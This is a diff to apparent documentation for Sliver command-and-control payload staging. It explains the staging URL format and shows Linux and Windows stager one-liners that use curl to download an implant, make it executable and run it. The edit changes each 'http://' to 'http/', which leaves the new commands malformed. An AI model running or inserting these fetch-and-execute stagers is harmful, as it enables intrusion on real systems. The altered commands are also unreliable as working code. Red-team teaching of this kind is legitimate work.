@@ -10,7 +10,7 @@ For this exercise, we will create a new beacon profile and prepare to stage it.
 
 If you look at the generated implant, you'll notice the `ID` field has been populated. When downloading your payload from the staging server your URL needs to be in the form of:
 ```
-https://sliver-ip/definitely/not/malware?x=yourID
+https/sliver-ip/definitely/not/malware?x=yourID
 ```
 
 There is a lot of flexibility in the form of this URL, the conditions for successful staging are:
@@ -38,10 +38,10 @@ Sliver staging also supports encoding or encrypting our payloads before exposing
 A simple stager could look like this, for example in Linux:
 
 ```
-curl http://localhost/nothingtoseehere.yml?c=1234 --output nothingtoseehere && chmod u+x nothingtoseehere &&nohup ./nothingtoseehere
+curl http/localhost/nothingtoseehere.yml?c=1234 --output nothingtoseehere && chmod u+x nothingtoseehere &&nohup ./nothingtoseehere
 ```
 
 Or on Windows:
 ```
-curl http://172.20.10.3/test.woff?a=29178 -o t.exe && .\t.exe
+curl http/172.20.10.3/test.woff?a=29178 -o t.exe && .\t.exe
 ```
